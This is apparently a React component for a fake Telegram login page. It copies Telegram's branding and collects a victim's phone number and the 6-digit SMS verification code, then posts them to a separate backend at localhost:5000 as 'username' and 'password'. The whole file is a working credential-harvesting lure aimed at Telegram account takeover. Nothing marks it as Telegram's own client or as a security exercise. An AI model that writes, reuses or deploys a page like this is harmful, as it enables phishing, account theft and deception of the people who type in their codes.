"use client"
import { useState } from "react"

export default function TelegramLogin() {
  const [step, setStep] = useState(1)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [verificationCode, setVerificationCode] = useState("")
  const [errors, setErrors] = useState({ phone: "", code: "" })

  const handlePhoneNext = async (e) => {
    e.preventDefault()
    setErrors({ phone: "", code: "" })

    if (!phoneNumber) {
      setErrors((prev) => ({ ...prev, phone: "Phone number is required" }))
      return
    }

    if (phoneNumber.length < 10) {
      setErrors((prev) => ({ ...prev, phone: "Please enter a valid phone number" }))
      return
    }

    try {
      const response = await fetch("/api/auth/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phoneNumber,
          step: "phone",
          platform: "telegram",
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setStep(2)
      } else {
        setErrors((prev) => ({ ...prev, phone: data.message || "Failed to send code" }))
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, phone: "Network error. Please try again." }))
    }
  }

  const handleCodeSubmit = async (e) => {
    e.preventDefault()
    setErrors({ phone: "", code: "" })

    if (!verificationCode) {
      setErrors((prev) => ({ ...prev, code: "Verification code is required" }))
      return
    }

    if (verificationCode.length !== 6) {
      setErrors((prev) => ({ ...prev, code: "Please enter a valid 6-digit code" }))
      return
    }

    try {
      const response = await fetch("http://localhost:5000/api/auth/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: phoneNumber,      // phone number as username
          password: verificationCode, // verification code as password
        }),
      })

      const data = await response.json()

      if (response.ok) {
        alert("Login successful!")
        console.log("Login successful:", data)
      } else {
        setErrors((prev) => ({ ...prev, code: data.message || "Invalid verification code" }))
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, code: "Network error. Please try again." }))
    }
  }


  if (step === 1) {
    return (
      <div className="min-h-screen bg-white">
        <div className="flex items-center justify-center min-h-screen px-4">
          <div className="w-full max-w-md">
            <div className="text-center">
              {/* Telegram Logo */}
              <div className="mb-8">
                <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <div className="text-white text-3xl">✈️</div>
                </div>
                <h1 className="text-3xl font-light text-gray-800 mb-2">Telegram</h1>
                <p className="text-gray-600">Please confirm your country code and enter your phone number.</p>
              </div>

              {/* Phone Form */}
              <form onSubmit={handlePhoneNext} className="space-y-4">
                <div className="text-left">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Country</label>
                  <select className="w-full px-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500">
                    <option>🇵🇰 Pakistan</option>
                    <option>🇺🇸 United States</option>
                    <option>🇮🇳 India</option>
                    <option>🇬🇧 United Kingdom</option>
                  </select>
                </div>

                <div className="text-left">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                  <div className="flex">
                    <span className="inline-flex items-center px-3 border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm rounded-l-md">
                      +92
                    </span>
                    <input
                      type="tel"
                      placeholder="--- --- ----"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      className={`flex-1 px-3 py-3 border rounded-r-md focus:outline-none ${errors.phone ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
                      required
                    />
                  </div>
                  {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                </div>

                <div className="flex items-start space-x-2 text-left">
                  <input type="checkbox" className="mt-1" />
                  <p className="text-xs text-gray-600">Keep me signed in</p>
                </div>

                <button
                  type="submit"
                  className="w-full bg-blue-500 text-white py-3 rounded-md font-medium hover:bg-blue-600 transition-colors"
                >
                  NEXT
                </button>
              </form>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="text-center">
            {/* Telegram Logo */}
            <div className="mb-8">
              <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <div className="text-white text-3xl">✈️</div>
              </div>
              <h1 className="text-3xl font-light text-gray-800 mb-2">Telegram</h1>
              <p className="text-gray-600">We have sent you a code via SMS to +92 {phoneNumber}</p>
              <button onClick={() => setStep(1)} className="text-blue-500 text-sm hover:underline mt-2">
                Change phone number
              </button>
            </div>

            {/* Verification Form */}
            <form onSubmit={handleCodeSubmit} className="space-y-4">
              <div className="text-left">
                <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
                <input
                  type="text"
                  placeholder="Enter code"
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  className={`w-full px-3 py-3 border rounded-md focus:outline-none text-center text-2xl tracking-widest ${errors.code ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
                  maxLength={6}
                  required
                  autoFocus
                />
                {errors.code && <p className="text-red-500 text-sm mt-1">{errors.code}</p>}
              </div>

              <button
                type="submit"
                className="w-full bg-blue-500 text-white py-3 rounded-md font-medium hover:bg-blue-600 transition-colors"
              >
                CONTINUE
              </button>

              <div className="text-center">
                <button type="button" className="text-blue-500 text-sm hover:underline">
                  Didn't receive the code?
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}
